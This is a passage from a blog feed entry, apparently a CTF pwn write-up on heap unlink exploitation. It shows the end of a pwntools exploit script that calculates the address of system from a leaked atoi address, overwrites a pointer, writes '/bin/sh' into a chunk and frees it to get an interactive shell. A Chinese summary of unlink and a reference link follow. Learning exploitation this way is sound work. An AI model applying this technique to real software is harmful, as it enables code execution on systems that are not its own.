class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">system_in_server=libc.symbols[<span class="string">'system'</span>]+atoi_in_server-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/qq_40827990/java/article/details/88090810" target="_blank" rel="noopener">https://blog.csdn.net/qq_40827990/java/article/details/88090810</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个s
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
